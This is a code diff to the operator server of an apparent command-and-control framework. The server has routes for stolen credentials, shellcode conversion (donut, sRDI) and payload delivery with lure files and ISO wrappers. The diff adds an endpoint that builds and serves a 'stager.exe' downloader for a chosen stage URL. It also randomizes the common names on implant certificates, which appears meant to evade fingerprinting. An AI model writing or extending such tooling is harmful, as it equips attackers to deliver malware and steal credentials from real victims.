@@ -53,7 +53,8 @@ func (s *Server) operatorMux() *http.ServeMux {
 	mux.HandleFunc("/api/creds",     s.requireRole(RoleViewer, s.apiCreds))
 	mux.HandleFunc("/api/creds/",    s.requireRole(RoleViewer, s.apiCredAction))
 	// operator+ (can task + build)
-	mux.HandleFunc("/api/build",   s.requireRole(RoleOperator, s.apiBuild))
+	mux.HandleFunc("/api/build",         s.requireRole(RoleOperator, s.apiBuild))
+	mux.HandleFunc("/api/build/stager",  s.requireRole(RoleOperator, s.apiBuildStager))
 	mux.HandleFunc("/api/deliver", s.requireRole(RoleOperator, s.apiDeliver))
 	mux.HandleFunc("/api/donut",   s.requireRole(RoleOperator, s.apiDonut))
 	mux.HandleFunc("/api/srdi",    s.requireRole(RoleOperator, s.apiSRDI))
@@ -748,7 +749,10 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	if cfg.Transport == "mtls" && cfg.AgentCertPEM == "" {
-		certPEM, keyPEM, err := s.ca.SignAgentCert("agent-remote")
+		cnBytes := make([]byte, 4)
+		rand.Read(cnBytes) //nolint:errcheck
+		cn := "agent-" + hex.EncodeToString(cnBytes)
+		certPEM, keyPEM, err := s.ca.SignAgentCert(cn)
 		if err != nil {
 			jsonErr(w, err.Error(), http.StatusInternalServerError)
 			return
@@ -2060,6 +2064,38 @@ type DeliverConfig struct {
 	LureName   string `json:"lure_name"`     // lure filename inside the wrapper (no extension)
 	ISOLabel   string `json:"iso_label"`     // volume label for ISO (default: Documents)
 	StageMaxDL int    `json:"stage_max_dl"`  // max downloads per staged file (0 = unlimited)
+}
+
+func (s *Server) apiBuildStager(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		jsonErr(w, "POST required", http.StatusMethodNotAllowed)
+		return
+	}
+	var req struct {
+		StageURL string `json:"stage_url"`
+	}
+	if err := jsonBody(r, &req); err != nil {
+		jsonErr(w, err.Error(), http.StatusBadRequest)
+		return
+	}
+	if req.StageURL == "" {
+		jsonErr(w, "stage_url required", http.StatusBadRequest)
+		return
+	}
+	outDir := filepath.Join(s.cfg.DataDir, "payloads")
+	path, err := BuildCStager(req.StageURL, outDir)
+	if err != nil {
+		jsonErr(w, err.Error(), http.StatusInternalServerError)
+		return
+	}
+	data, err := os.ReadFile(path)
+	if err != nil {
+		jsonErr(w, err.Error(), http.StatusInternalServerError)
+		return
+	}
+	w.Header().Set("Content-Type", "application/octet-stream")
+	w.Header().Set("Content-Disposition", `attachment; filename="stager.exe"`)
+	w.Write(data) //nolint:errcheck
 }
 
 func (s *Server) apiDeliver(w http.ResponseWriter, r *http.Request) {
